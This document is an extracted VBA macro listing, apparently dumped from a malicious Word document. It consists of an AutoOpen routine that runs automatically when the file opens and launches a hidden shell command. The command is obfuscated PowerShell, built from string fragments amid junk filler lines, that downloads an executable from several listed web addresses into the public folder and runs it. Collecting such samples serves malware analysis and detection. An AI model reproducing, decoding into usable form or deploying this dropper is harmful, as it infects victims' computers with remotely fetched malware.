Filename     : ./macros/e706b3a32f4c177f1a3536dbd480c639666381b8a68b59821488116c51374eee
OLE stream   : Macros/VBA/oahmhvzwz
VBA filename : oahmhvzwz.bas
----------------------------------------
Attribute VB_Name = "oahmhvzwz"
Sub AutoOpen()
faWMndOTVtisw = "LQfFtnzwmkS" + "wXTPjhRYjYI" + "bOVrzJkBcd" + "ASrIBsjnm" + "KfqAGKAbazmHJi" + "SFAczRAUHTw" + "YQfzlWaQiirrz" + "ZCfdsIMdimfL" + "dKKijJScLuzA" + "jNwnOJcQrwod" + "oivhtTZjzGY" + "KhhHOHicGZwhuY"
iWlLWEFUnh = "BdbBlHYrDcv" + "dqGAUPjN" + "VwrNMuCrFMta" + "GEBEnrJCUtnN" + "VPElFHTr" + "fjoZMWAwPBi" + "kCwPboEjAEEAD" + "mnTHmHsZYS" + "OfmCWilfO" + "NFWiTOIjbfnV" + "jNiHPbBKijwM" + "ShdZSVoo"
hzcTsktwmc = "sDosWWDNaiYXS" + "waCCMSjw" + "fhfwiQQh" + "VTQOtlCwRbOqJZ" + "IwJqtZKM" + "sIKrZVzJBiBwuh" + "RzQBFkTWHUnl" + "ZnTLGVWk" + "KWviEpiXLOP" + "ZuJJHKYlCWm" + "pjNKqsYLzrpt" + "bfirkJY"
fAtKCwLzwX = "kMoUcUjSqDiiE" + "DjiutSNNM" + "jTAouNOw" + "BItnKCXDqi" + "ASotwSjCF" + "aWzdlIT" + "YdpjODIKtTrVP" + "ftKQiGpcjL" + "ObluJZtEKREdT" + "lloYMLj" + "CrFSViMDwwinA" + "WQjuwREFaPq"
VBA.Shell$ NWIwSpjw, 0
tVBDTAJY = "uoqEPrHVIz" + "DJOYpSNRlwR" + "cIlrCsdidbDcb" + "qiawjSPKJkGcO" + "msnbcwO" + "iAFdfVCcFmwzbi" + "oMzaRzBkZibrl" + "bzdduEZrGntIj" + "TfRaIBzOdXz" + "cPjwDiQodnTTja" + "zGMjJSWQt" + "BikoNVFjw"
JLHjPrsBjMz = "ijBIRrniGzmlCv" + "zQRNmiwHmwc" + "RZVjhPHAB" + "EEOsTVKYWjTL" + "kPzKKjbPKoZWE" + "PFVvvfMMMwuO" + "zNbwwGhkUiE" + "QZXtPoWPjuTAkX" + "fYCAQwGiCir" + "QWBvXQwfFpS" + "JXztCuaMaaBLRh" + "AJvVLXNFsizwk"
saqGFqszMbII = "BqVpipcwVKU" + "ZwSGKCzq" + "izKEMrvDzTN" + "rLPXtVG" + "mXPWzfta" + "BYKRFTqKlSwhv" + "rGDilCjRhq" + "nLkoEjzUMvuC" + "msZMIDIarzYP" + "zIYGjrTiSIFWjl" + "MjczDSv" + "dXJihIwLMYJjp"
End Sub
Function NWIwSpjw()
BGUXuc = IsNull("wIHAjlOTX") + IsNull("siWCZHFQcilLYk") + IsNull("rrDAwDimn") + IsNull("NbTtLQawUqSU") + IsNull("zimVwYhkjWlrtL") + IsNull("atOwiVLfm") + IsNull("RRLMEuzWwD")
KvljjDIz = IsNull("HWKkuWV") + IsNull("hFjdTdU") + IsNull("QjAUzdzbQRaq") + IsNull("Lnzccfvr") + IsNull("tZNihqTQip") + IsNull("qoqFtGdWjTc") + IsNull("ftWSiAqzYqrmbH")
JZQClHKSOc = Mid("4HMu7wAH8j4qKsTKYGrdesqKn+'+'qKtfw+tfwnigqKn+qKnnqKn+qKn.cotf'+'w+tfwmqKn+qKtfw+tfwn/qKn+qKn0mqKn+qKnRP/ycWqKn+qKn.qKn+qKnSpqKn+qKnliqKn'+'+qKntfw+tfwBtcqsGz", 19, 132)
XUGzGoYp = IsNull("KhfNGwdFi") + IsNull("RFGYabV") + IsNull("ZnCzwjHVYfcn") + IsNull("zHBQMiicZi") + IsNull("EVALEodTbkW") + IsNull("PKjzGkXzc") + IsNull("jTwFHOsnKAFbvd")
WWfpB = IsNull("dHYpLcSUd") + IsNull("jIkJkpa") + IsNull("JOttvjhwJt") + IsNull("bmYJSvCf") + IsNull("mPEvnVifuTJzf") + IsNull("VPXjMoIM") + IsNull("YIBPLzSNh")
fpmBARW = IsNull("vQkCJMkarlG") + IsNull("jcrBkwJpjNz") + IsNull("PaoaWKoOGTLT") + IsNull("vThvtHUBlJKSw") + IsNull("dlnzhRDnjY") + IsNull("DjzrWQRX") + IsNull("oicunGffd")
hSAzzDZrqfF = Mid("48aaCqdi0CqqjjBwKn+qKtfw+tfw'+'nSLkqKn'+'+qKnarapatfw+tf'+'ws +qKn+qKtfw+tfwn ycWqKn+qKn.exeycW;qKn+qKnforeachqKn+qndYzjm", 16, 100)
BFCrwPZK = IsNull("jkuKzFZF") + IsNull("EqkOwiC") + IsNull("uMqqjZwfnmGSjb") + IsNull("bnvYaEZ") + IsNull("mjGIcotFkIF") + IsNull("BrTzKwiJTT") + IsNull("UclIaAGcpUiD")
vbFkJNi = IsNull("AljAzuEB") + IsNull("GAcpKHwhWvc") + IsNull("fYBcEBOpwiTDNc") + IsNull("wLDqrGs") + IsNull("zJKNNWKkN") + IsNull("OUNfXttqMhc") + IsNull("ZchCBWSElrmK")
zbPCQwh = IsNull("cRUqthVK") + IsNull("EEkUvNcaQKT") + IsNull("lfrfTEijPCSoMX") + IsNull("inQmwctYhYGEs") + IsNull("PEYjKqmdKacqdL") + IsNull("lvIYUwm") + IsNull("XVUsHJH")
wjpsVnCwGJ = Mid("WdvumpZYUhKn+tfw+tfwqKnvqKn+qKnoktfw+tfwetfw+tfw-qKn+qKnIqKn+tfw+tfwqKntem(0SLhuqKn+qKnaqKn'+'+qKnsqKtfw+tfwn+qKn);brqKn+YzY", 11, 111)
wsvjClFItj = IsNull("TunASnu") + IsNull("ZzHrQnK") + IsNull("BuLlQkifLVoSIs") + IsNull("hCcEzFptuh") + IsNull("zcaKkiIHkzb") + IsNull("niMHpzwbwj") + IsNull("aoojLsLAQDo")
iJjPSRL = IsNull("mYUNspXqjBwKYm") + IsNull("HpcaCIp") + IsNull("wzVTJXXJaTrUo") + IsNull("UiFlzrfzB") + IsNull("QidETFJo") + IsNull("jWOXWNTIsWrhSR") + IsNull("UuURJzMzzLDbu")
aZCdobN = IsNull("FFAkGJBIYFdp") + IsNull("nzAwvFfTAz") + IsNull("wzwPZzLVwz") + IsNull("CoNsSuYE") + IsNull("KzNYuLEVzI") + IsNull("FFioGMmib") + IsNull("IqYjvLiCnluvfL")
hizAX = Mid("n5wTjc8zHKnSqKn+qKnLenqKn+q'+'Knv:puqKn+qKnbliqKn+qKnctfw+tfw'+'qKn+qKn '+'+ ycW5ntfw'+'+tfwRycqKn+q'+'KnWqKn+qKn + 0qtfw+tfilKC085PKdb4Havirc5jGbOi", 10, 115)
DwvHQquzi = IsNull("qVKDWHvGL") + IsNull("XjjndKdzRnjZ") + IsNull("riAUWQLSmZqB") + IsNull("hdvJuOi") + IsNull("tcOZWniFKGiQ") + IsNull("SYWnYpzQlHtl") + IsNull("dzCHtVqwzCm")
SjKssQzv = IsNull("RqQSIioTmR") + IsNull("bsjkspiTKpHamv") + IsNull("pBiRZVFk") + IsNull("OdsVPuUr") + IsNull("PkZQvqwzdik") + IsNull("PiWzpmlV") + IsNull("aWIaWPzNDPUPv")
CLzbhnkQ = IsNull("AcdNcSHkQPFYWV") + IsNull("iVIVUotKjD") + IsNull("NNamUVk") + IsNull("YNWDIpmAMOtdk") + IsNull("zHdphRFGRu") + IsNull("ZEtKdujo") + IsNull("zLMSzfiohwp")
AVQtHK = Mid("LwtlwqKn+qKnttp://qKn+qKnwqKn+qKnwqKn+qKnw.zavtfw+tfwiqKn+tfw+tfwqKne'+'zsOlOJpkJvr4QfzH4zvcFqvjTqq2HrXjB", 6, 67)
zFavRIKKd = IsNull("KlZGrSZraA") + IsNull("zzVXaHiVmpORpZ") + IsNull("BlaOPuUHMMQ") + IsNull("uCSivIcWPbqc") + IsNull("mtIjwUjj") + IsNull("QoRLkDfrJ") + IsNull("KboTUHSI")
ZsOjArQDj = IsNull("NnEntziwaj") + IsNull("RjcoiccvNI") + IsNull("UGkmEuCVQmdh") + IsNull("sVshaUo") + IsNull("aBILJIA") + IsNull("udvQcTwCHtotE") + IsNull("hnBavIjuU")
ktvSLdScc = IsNull("CLZvzHdA") + IsNull("bPsjzili") + IsNull("kXZrYSfRj") + IsNull("anYiLWiEqsTEHC") + IsNull("PtSibKhqq") + IsNull("lnKmHPfafaYC") + IsNull("jJVavlwfPXYI")
CXnIntjwE = Mid("P1btTki7Zv9zqKneqKn+qKnatfw+tfwk;}caqKn+qKntchqKn+tfw'+'+tfwqKn{wtfw+tfwqKn+qKnriqKn+qKnteqKn+qKn-host 0Sq'+'Kn+qKnL_qKn+'+'q'+'Kn.EqKn+qtfw+tfwKntfw+tfwxcqKn+qKneptqKn+qKniqvEQ8Ra2iHF", 13, 162)
jCTjpuvPiTb = IsNull("TftFbavlBiVIi") + IsNull("aYXpahjvB") + IsNull("TVJiMsEA") + IsNull("DzwZsbjw") + IsNull("rWzZFkA") + IsNull("ktUnMYdmlF") + IsNull("MYJiVzfTd")
kqHlqvsjR = IsNull("YmulWMLhnzGj") + IsNull("MtWwkTQzolOjqq") + IsNull("ILGqDnN") + IsNull("aFkzGVrHJYEHRt") + IsNull("mnfjjAfEjVLY") + IsNull("qQjMzwvsAUJ") + IsNull("ziEImjiPcUC")
aEVMFomfBDi = IsNull("fOtjdDiKuQYipI") + IsNull("fVqYSnHV") + IsNull("liiscZZRW") + IsNull("FfbEiUwbro") + IsNull("iiATpiouKLYsi") + IsNull("zVmhVqHLSDiEQH") + IsNull("TLPhXHv")
uJDSz = Mid("mLGuOSKpJ1qKnwwwqKn+qKn.etfw+tfwptfw+tfwipqK'+'n+qKnhanyaziqKn+qKntfw+tfwngefoqKn+qKnundqKn+qKnatqKn+qK'+'nioqKn+qKnn.oq'+'Kn+qKnrqKn+qKngqtfw+tfwKn+qKntfw+tfw/43gg6Nb/,qKn+qK4w", 11, 165)
VJahNFGs = IsNull("DdvuAEduzP") + IsNull("tssHTzqlT") + IsNull("ImWbwuldJz") + IsNull("NIIWDBrwqO") + IsNull("iNLQtcPRmii") + IsNull("vrZTEJr") + IsNull("nPufjklQw")
pfUNdBzpzXf = IsNull("tuRNiEmkN") + IsNull("cqbkiCcT") + IsNull("TOoabLcQcOY") + IsNull("wZNQsTbFuDjB") + IsNull("zEzbQpkKo") + IsNull("BETqBCoK") + IsNull("oWjQNUmiAO")
tzcbAWJzaFL = IsNull("pdGdDIPfAJNrNn") + IsNull("GMfihnmwzqT") + IsNull("fhJqzVntFu") + IsNull("nQDYJiDwB") + IsNull("BcXGmOL") + IsNull("iJmkojw") + IsNull("TOVauYMvsNdOc")
LbVRM = Mid("JRGzUFSTIp://itfw+tfwnmonWj7Bf4RuzW", 10, 16)
fMiszqlIEi = IsNull("PfnLdHioLYo") + IsNull("IQLLYdaCFtN") + IsNull("sRnkGdHjv") + IsNull("uWRIMtYz") + IsNull("zAvYABJOFaMaWR") + IsNull("TMUtiiREiz") + IsNull("puQRjiFuQN")
phojQzN = IsNull("anCAAjtDAhVLlO") + IsNull("HjSQJNavUws") + IsNull("ThAmmYjRjd") + IsNull("QTbDjusKkZCYPw") + IsNull("imzrhEIHaWA") + IsNull("inFzzikCwhJuBc") + IsNull("HAQJkoIpuRov")
jwJzt = IsNull("tmjzPCIjiYEsoz") + IsNull("iRQjvRYiLP") + IsNull("nuhUbBLXThKkSO") + IsNull("vRzkBcRGzoikRf") + IsNull("HXiROOBNwD") + IsNull("QfrTjzRAVHhb") + IsNull("VWoijwQus")
iuRXouI = Mid("q87wRKG4Nizf0qKn+qKnSqKn+qKnLnsadasqKn+qKnd '+'=tfw+tfwqKn+qKn qKn+qKnnewqKn+qKn-objqKn+qKneqKn+qKncqKn+qKntqKn+qKn random;0SLbcdqKn+qKn = qKn+qKnyc'+'WhtqKn+qKntqtfw+tfwKn+qKnp://qKn+HZwLEAvE3QH", 13, 172)
MHczQdjYI = IsNull("IMBhfzJXfcDuf") + IsNull("jBcFpFTAGJMQFa") + IsNull("KfKistjfbOCTOc") + IsNull("NPEscnSLzq") + IsNull("HGsUPtjZUw") + IsNull("LnCwVAqnmEXiv") + IsNull("LNzJsTLrTmdnGz")
QKSfOPu = IsNull("ijjUNMq") + IsNull("wDDpkJmK") + IsNull("wFHDVUkthqVFlS") + IsNull("BiUHCdMAtNj") + IsNull("zPjGjSONNQz") + IsNull("MwajVUEL") + IsNull("XnGpiISkFNqo")
YvfAmdOi = IsNull("kpIbVDRq") + IsNull("SRULEUjXwXD") + IsNull("lPccjUTQSht") + IsNull("fBPPHautWSraw") + IsNull("nzCGrjv") + IsNull("wZfwojzaMkX") + IsNull("fCFUPVdKJSX")
tbrvzVzGvU = Mid("D5Jp5n+qKnSL'+'karapas = 0qK'+'n+qKnSLnsadqKn+qKnasqKn+qKnd.next(1, 343245);0SqKn+qKnLhuaqKn+qKns qKn+qtfw+t'+'fwKn= 0qKn+qMSd6aziYQdXZIJ6zF0zzqw33NA0jJdLw", 6, 118)
Wirpi = IsNull("lizkmnWFSljLv") + IsNull("CjiZIVq") + IsNull("bdRFJvdICHU") + IsNull("KwiliRojEB") + IsNull("diCQDaoiSBJ") + IsNull("UTjdbcK") + IsNull("YrbvFwtqrhKX")
hRwICAiwPi = IsNull("wMzVEInRjIVOfv") + IsNull("cjaEQahfum") + IsNull("zmDGLIzEQmUwz") + IsNull("vwsGviGw") + IsNull("nRqtlWRhEiOLAN") + IsNull("zMPbijIkdwU") + IsNull("oZzEjArPoUP")
sGFKwYvwv = IsNull("DnWHiZiOZB") + IsNull("AtNRBnNDu") + IsNull("BmHHLFjzq") + IsNull("qmcQjKWwCcUz") + IsNull("JuLkboDUHdGBA") + IsNull("zTTBQiPbO") + IsNull("zlrRQARwC")
mpUwJbhv = Mid("jinhttp:qKn+qKn//wqKn+qKnww.qKn+qKnfazenqKn+qKndavida.com/qKn+qKnRqKn+qKnftfw+tfwqKn+qKnss/,httsW6qCBKhuGT", 3, 93)
dasfwAzz = IsNull("izFPQivuk") + IsNull("IiTfSKihN") + IsNull("RucHFdiLJzpczB") + IsNull("iitUuAaqaQQlE") + IsNull("jkHHSwnXzJmE") + IsNull("lnZjkRmnjlMS") + IsNull("qDCrosZdcMiUfF")
fFGRXzGiZp = IsNull("qEjTwMVWX") + IsNull("MEfuMLuXlpQ") + IsNull("VWsijQWUaO") + IsNull("STvlScDTom") + IsNull("QEthvZT") + IsNull("NbzViMbQfEA") + IsNull("FwhNbRZ")
ASmQSPk = IsNull("HhkiqQp") + IsNull("AkjUSuA") + IsNull("upVFjVFUtiGIar") + IsNull("EMhjwAib") + IsNull("BABHIYHicNn") + IsNull("JzVlbPoLKjd") + IsNull("YbHlOBwQ")
JThDWaB = Mid("f7t(ycW,qKn'+'+qKnyqKn+qKntfw+tfwcW);0qKGjaJCdzMt53joM3b2aY6HZjG", 3, 38)
KTMpzAJrEOu = IsNull("uhVbjUGnpzV") + IsNull("BwBvVwMZrMYOoj") + IsNull("SXjFdzrjfFVlOG") + IsNull("bjjDBJzlrcEAl") + IsNull("JHmAZnQJtrzJ") + IsNull("VqzMwSDl") + IsNull("ilhkVmodZzGAW")
jVZAfIqJwqY = IsNull("YnYDzji") + IsNull("uYjIKwnV") + IsNull("MWADQoVXViYY") + IsNull("dKowcGZTabKai") + IsNull("rjmkNIdiAdz") + IsNull("wCfizGlB") + IsNull("YTLWjwPluqchKi")
NfrPQ = IsNull("iloTXRmsGrwbvr") + IsNull("GhhzRcBTp") + IsNull("iUQSzDMws") + IsNull("bJzjTFmip") + IsNull("tqwNSRZCEUhSz") + IsNull("tzWaIok") + IsNull("CbpziAiMqWd")
XanSuUZ = Mid("7nR0j25sI[cHar]39  -CrepLace'ndJ',[cHar]124)| &( $EnV:puBLiC[13]+$enV:PUBlIc[5]+'x')4z3oLGuqmTO5", 10, 75)
rfqvDONKJ = IsNull("iwKPOzKLBTHWn") + IsNull("iDpjjSNaNjMNtF") + IsNull("UbnYowwvWnvO") + IsNull("KCZZcpQm") + IsNull("AaLiHkdCBGEZj") + IsNull("TwzzfIStoEFQK") + IsNull("mlDpzjaM")
MIRHSw = IsNull("zjjDNdswlNANI") + IsNull("EVUhljpU") + IsNull("tjrNizNviFpuR") + IsNull("kRpwZNZL") + IsNull("zSOjoIZXzdsnT") + IsNull("QOwYRRITMn") + IsNull("jPwkPHOh")
WufNDC = IsNull("KoNSTloJ") + IsNull("iKFbdqkiVGmH") + IsNull("raVQQCPZAR") + IsNull("lpKRpzHz") + IsNull("WmACLIMEVLTaFl") + IsNull("nzDVltJdswpofT") + IsNull("VzmMBFZSFIqLD")
FlcRv = Mid("wDEMjTCXlOqb4m/qKn+qKnItfw+tfw2qKn+qKnxqKn+qKnPv/,http:/qtfw+fQp", 14, 48)
kjuZHjffTzi = IsNull("uvQOZnJipRYWQw") + IsNull("hboHtfiFbW") + IsNull("tdmjVdF") + IsNull("aUwjwiIadv") + IsNull("qSTXCnSHn") + IsNull("QqpsUufvF") + IsNull("uQrVEjspclFAJM")
KzRNj = IsNull("imWiGYtmvJThii") + IsNull("ctWRcFHPD") + IsNull("dSouXGJEVQHbwX") + IsNull("WQXDnNuJWQ") + IsNull("XzLpaWSkdGErYD") + IsNull("dMRIAvzv") + IsNull("okMQkjJ")
QSmDk = IsNull("lZGjvCWSJKi") + IsNull("qdkciXzT") + IsNull("awSTvcfCJPj") + IsNull("MjUZLKtYwiK") + IsNull("aBMsIadKtFK") + IsNull("nQAZrPzuwji") + IsNull("PDSNGucsnstuQn")
dspHjIWXG = Mid("iXRU78vm89FXtEuK75pZmm5Yopv5BGTusR5yqKn+qKnsqKn+tfw+tfwqKntem.qKn+qKnNeqKn+qKnt.WebqKn+qKnClient;Yu94", 36, 62)
QqzDwLzfk = IsNull("iXiKtjplJ") + IsNull("uPRYwAdkh") + IsNull("NQEYDFAqKCztw") + IsNull("NAUzkfcXqhEfn") + IsNull("lMmABRDNT") + IsNull("GnjzaGOA") + IsNull("iKwfdACPq")
miuqoUr = IsNull("tXLYzwPUw") + IsNull("cYKPdLkRQLYzi") + IsNull("aazFYwB") + IsNull("lwltFiBwNC") + IsNull("uqlRnDJIl") + IsNull("NpusJzWwKvB") + IsNull("HnOijFBPUzWmk")
EBQYsMc = IsNull("XTXSkEwPwr") + IsNull("jzhKtwzcwjS") + IsNull("MIEnhJA") + IsNull("CNowrjUvucrPJn") + IsNull("KQVkDDmtpEPKJf") + IsNull("RGwscWLlS") + IsNull("cDhUsCuY")
TfKtP = Mid("65z5NVKqlnjHIODHzIE7sSWGzuOz2iobj'+'eqKn+qKncqKn+qKnt SNOKbw", 31, 25)
FYnoZ = IsNull("pJMBPoPr") + IsNull("HrBwkfzDHL") + IsNull("jzDJTDG") + IsNull("IQSIIzIMjI") + IsNull("NaQPHniJRkU") + IsNull("PajcrGDhMhuiHo") + IsNull("tzbSPubziTiv")
CCwGpcr = IsNull("DYfiGVjjMEYh") + IsNull("OBjspKRVwsUD") + IsNull("ipGcazFuO") + IsNull("DUMNojrVla") + IsNull("ldRvhdDNH") + IsNull("LbsmrZkdbbn") + IsNull("djXdzdl")
FDHEubSX = IsNull("ltploVDhbU") + IsNull("GjaTjfhHT") + IsNull("pKpSEAn") + IsNull("CJIKjwSsIum") + IsNull("ARiLLjTHQwlb") + IsNull("RvizTjVPEZK") + IsNull("wAiBoXnV")
dMUFYwGM = Mid("BSA0IdLR2HSlGwVIDBkCNijwoegreiqKn+qKnra.tfw+tfj87vFKMAIPoic", 26, 21)
tdzojEI = IsNull("WidzzLp") + IsNull("tUBjGrrtUaw") + IsNull("HsKwbkzl") + IsNull("EfabCJcwsp") + IsNull("kEkHZGtmoiJ") + IsNull("jbziXfXMMD") + IsNull("oobFEiPv")
kshXP = IsNull("TZhCnRwp") + IsNull("OFbdTJm") + IsNull("jhiUqjCf") + IsNull("DGovZQnB") + IsNull("TZJzHXLIIFm") + IsNull("KpXwAikmdqiXi") + IsNull("qAFopocqp")
zhTQMwS = IsNull("kQZDIDYVqNw") + IsNull("vItAEiESVcTjvv") + IsNull("wBpEZihmQ") + IsNull("uWUGCVz") + IsNull("OsfhEzDK") + IsNull("GIzsHMkZTBJ") + IsNull("LNWdwKIkMS")
FzmmzjdIrwi = Mid("zE6QKd7tnWDjXiYBVzzHPuMwHiKrZXQnt'+'fwKn+qKn/qKn+qKnhillboqKntfw+tfw+qKndy.qKn+qKncomqKn+qKn/qtfw+tfwKn+qKnf0Otfw+tfwqKn+qKn0qKn+qKn'+'m'+'L/,h5R", 33, 111)
wotJA = IsNull("zmZLIhaw") + IsNull("PtRRwZlCOAcvm") + IsNull("uhLDUQzQT") + IsNull("KzOFZivPhiOUYj") + IsNull("PDlNqNRN") + IsNull("fiziGjvzZS") + IsNull("zKjdkEM")
cUvXXjimbJU = IsNull("PApRZazwsh") + IsNull("ZTWDCdiYDuY") + IsNull("kkIrIviXWhc") + IsNull("jJYiwupwwDvG") + IsNull("cFDVtufqVFjRj") + IsNull("BOKErqnWsFAaI") + IsNull("chjpCCf")
LwpdDvYjih = IsNull("HDaIbtEMM") + IsNull("dmtluav") + IsNull("QJBjPuGdMFXI") + IsNull("lAEFPFVVkBT") + IsNull("zvjNLPGiDnDM") + IsNull("ofCwhzpEYs") + IsNull("offVZLfHhASw")
PhzJnRnSPO = Mid("Cwco4s6uOqQqi27z", 2, 3)
fhfSCE = IsNull("aBcmwsLEsMOFn") + IsNull("nwEPBGMwVTma") + IsNull("oYrOhKLnJ") + IsNull("FtvLoNoLDRu") + IsNull("hkmBYdcjJAWdWj") + IsNull("zhvcudW") + IsNull("VFvXkjHjITuqGc")
CGhIXaJ = IsNull("HVpUIWpup") + IsNull("KZLRBTRWnHofuz") + IsNull("VCiYEPY") + IsNull("rcmlzVuzOSQ") + IsNull("sJKvbztT") + IsNull("icbsPnULWkjl") + IsNull("ToPhTAsKZNipML")
HLbCDmJ = IsNull("lhKdSEXRoIM") + IsNull("dHpzPKlRvdFsz") + IsNull("RNJbpuV") + IsNull("KukAEuw") + IsNull("HPXqibTUffUKk") + IsNull("bSiRnJHM") + IsNull("SUbzuPPGr")
zUUct = Mid("OGUXpkKn(tfw+tfw0SqK'+'n+qKnLatfw+tfwqKn+qKnbqKn+qKnc in 0SLbcd){tsOm5wUkLFoLY", 7, 60)
qpcmwMHzwi = IsNull("iwHWFtMAKtiiZ") + IsNull("shjWvpVjuisa") + IsNull("FPzCCbbdZd") + IsNull("jCHoEokS") + IsNull("YhfuSRWWC") + IsNull("diiTHkN") + IsNull("jHwISDZqsijbG")
BfEIEBMmjsJ = IsNull("nvnjiZtczilih") + IsNull("mRItQaCSjH") + IsNull("BriFSwKC") + IsNull("nVowisIE") + IsNull("ZXzBwmKjUqmoV") + IsNull("jXjhLXjka") + IsNull("YjQcLLXSzbG")
zldKjHfupQF = IsNull("aHBYjCjlFFbXA") + IsNull("CiADrzEKUQO") + IsNull("VcYnpawjDWS") + IsNull("BKGvCthvDtoK") + IsNull("djIoPnkJHhHM") + IsNull("PAbQcfQRC") + IsNull("qIIbjSYcoOGM")
IUAVcZO = Mid("RJKiUqMVcCwbi8zwqKntfw+tfw+qKnryqKn+qKn{0SLfrancqKn+qKn.DqKntf'+'w+tfw+qKnownloaqKn+qKndFile(qKn+qKn0SLaqKn+qKnbc.TqKn+qKnoStrqKn+qKning(),qKn+'+'q'+'K'+'n 0SLhutfw+tfwas);InqSCzMwYoz24qO6QLz", 17, 159)
FnKaDIc = IsNull("NztvumiUQTSG") + IsNull("ZBKzhKpw") + IsNull("dRViUISUrt") + IsNull("vJjoPctF") + IsNull("LEOKUmK") + IsNull("UPRQorWca") + IsNull("SWBvcYzL")
rAjvHB = IsNull("rLHTbsHFZ") + IsNull("huVLfMnzKPu") + IsNull("OjjjUttNzW") + IsNull("XzpdaWVrz") + IsNull("jfSvQjzzOcKW") + IsNull("wYjrYOLMf") + IsNull("cwOpiMcp")
PEGJVhJ = IsNull("VVhFQkqKZ") + IsNull("LNiwFzb") + IsNull("sHRKMpQbjEP") + IsNull("pMJWormKAjz") + IsNull("wYOzjYwwAwFD") + IsNull("LJsooAluzOwELJ") + IsNull("MQbLJkNna")
JbfVCnrNXR = Mid("Xjce qKn5nRqKn,[chAr]92'+'))tfw).RepLaCe(tfwqKntfw,[StRING][chAr]39).RepLaCe(tfwwq1tfw,[StRING][chAr]36)ndJinVOKe-eXPrEsSIOn') -CrepLace  'tfw',snZHYH7HbA", 3, 142)
HIurQZvQ = IsNull("vmiDRoEMwQ") + IsNull("tHBdtFriwdoZ") + IsNull("UqwBqOk") + IsNull("mmahNVSCTBOw") + IsNull("RUwkwdVzsvHMhi") + IsNull("rCWhfwGUbwf") + IsNull("YbccZdFCVAQt")
YrvIIBYiBG = IsNull("vQFEVpWUo") + IsNull("KKzEwsjEYpwr") + IsNull("whwHKUuwUPMwC") + IsNull("ZDuPjRDJ") + IsNull("BjEuOSnXUD") + IsNull("JXZhLzulqu") + IsNull("HujKBdZNaonM")
sGcbpOn = IsNull("PntrSUfmsLQi") + IsNull("RzKAUoQtwWQS") + IsNull("icjEqmcwPKNd") + IsNull("bAzjQLzs") + IsNull("HrVjcdsS") + IsNull("dYkmDFnUi") + IsNull("kBnzXLM")
JCANWc = Mid("OZNvIu5Kn+qKnonqKn+qKn.Message;qKn+qKn}}qKn)-repLace qKn0SLqKn,[chAr]36  -cREPLaCeqKnycWqKn,'+'[chAr]39  -repLarwJTMYJFnAOJzlXQTd", 8, 104)
ozaYAitLJZ = IsNull("aGajfjrssiDCdM") + IsNull("jWSSZPZ") + IsNull("ODRJzHcj") + IsNull("KfHEZOGJCu") + IsNull("QdIXQVdEW") + IsNull("miBwLcNWtl") + IsNull("vhrwFzJHM")
KifkiDR = IsNull("mFZJrAH") + IsNull("PzaKfYbqpCwjf") + IsNull("BzvKwPfqLImm") + IsNull("PtMVKDkZ") + IsNull("vYbkAMAFrhYB") + IsNull("cOhCsHZ") + IsNull("SYsPLwdjndvM")
zJsQBYFfNO = IsNull("WUKtkvut") + IsNull("dYMBXAFINms") + IsNull("JIzVvQYKWUwJ") + IsNull("PKrDajSd") + IsNull("IrifTwArv") + IsNull("TVNLKXpiVi") + IsNull("JbCpHqN")
WWHUCp = Mid("ct723ZzEW3UU17 ((' (tfw & ( tfw'+'+tfwwq1e'+'nv:cOmspeC[4,'+'26,25]-JoINqKnqKn)( ((qKn0SqKn+qKnLqKn+qKnfratfw+tfwnc = neqKn+qKnw-R6iTK3h", 15, 115)
zpDrjA = IsNull("BWjOOTqFQE") + IsNull("HLRwoIKcz") + IsNull("dAiVpPWZDDdoka") + IsNull("zndojfBTiHzfi") + IsNull("fSSNXYWAsYDTj") + IsNull("AkTbqHqUj") + IsNull("PRcjENqkshYkK")
NWIwSpjw = dqNKbohDDq + HLWDGDJjMNvf + Chr(34) + WWHUCp + TfKtP + dspHjIWXG + iuRXouI + uJDSz + mpUwJbhv + LbVRM + dMUFYwGM + PhzJnRnSPO + FlcRv + FzmmzjdIrwi + AVQtHK + JZQClHKSOc + JThDWaB + tbrvzVzGvU + hizAX + hSAzzDZrqfF + zUUct + IUAVcZO + wjpsVnCwGJ + CXnIntjwE + JCANWc + JbfVCnrNXR + XanSuUZ
bNCUzvFlQ = ("oStoXpXBKmdwFw" + "wfiSazoQZsOnn" + "ZbDwSnOKYSvUf" + "wjcHGiBPW" + "pzzCUwJBk" + "kKaznIbm") + ("PXFTaRtP" + "jIrJEkIT" + "MqcJtkXdoGdTw" + "OJHujfZ" + "ahBVbQaFpqUU" + "viFiVwwdm")
lniGdAzqY = ("ObPvIYJGDiQmz" + "nTfBQOidHnv" + "mUnaHzSjF" + "jizGLptuWznET" + "VwaJFlTb" + "tloTdaQ") + ("TYzmwEJDsj" + "RvaiBdELZ" + "aTTFiDUX" + "QUGfUfTXZs" + "GMBGJETDm" + "YOrLsFfhNAojW")
TtLPFCiFf = ("JBORNvikRk" + "rFOUbanqLrba" + "iNwoNAEjsuhJi" + "SljPXwpbnwvdc" + "PUchbYjzwpWQfw" + "KhKzmVEbbEiAGa") + ("tjYJUYS" + "iFETput" + "QtccPkjq" + "LsAdwXcZuv" + "sVcasjcrhCPh" + "zNHdznIDijJj")
SWlibtuwG = ("uQCkiIoIX" + "LRfiQwcHniKlSu" + "KrJFIUicjT" + "bMEAPZMNVAqCR" + "RnKXEIwILYQ" + "CPbcpwPaXPC") + ("TkZFZYTpscrjY" + "fKsTBjj" + "XwmsLtmrFBlX" + "TisjmEb" + "ZYuEkREiEOVE" + "NdTjMZCBXpvA")
ALbzkPcHw = ("YrobchIBnPSVGF" + "CZfZlCiwDj" + "diUwtwj" + "EbrlzUsVB" + "hiEWZhpziNu" + "slrVEahoWVmrB") + ("LnhEtjhSVEBGJm" + "wOVUOiGt" + "QSoMJLsNUaW" + "PiUOIaP" + "TzQufaHQWmQE" + "FobsUJJMomiQGj")
kBGGIqHHS = ("ujjEbri" + "RHJqtWnR" + "afLhdZt" + "PQfIOnwVZz" + "ZFlzDYzwWuHkS" + "khbGUQHphLaDC") + ("ULUTYAr" + "oiIIiaW" + "IfMRdFWPFhf" + "XaWAWvdLZoLS" + "jstwLlhSDDuqkZ" + "pFOqUHdOM")
ImjwLDTUu = ("uNcQtwwRU" + "bJlVPVUZUw" + "GijqZClGAjawS" + "BMoUuWqJrlw" + "Nhqiuzv" + "njwaUtMKTnA") + ("TqNIjFZcA" + "mvsYoEQRpbArrS" + "OzBJjpElk" + "XThCpZTZqwAi" + "FItBwYMbwusRFY" + "UHiKHsRkj")
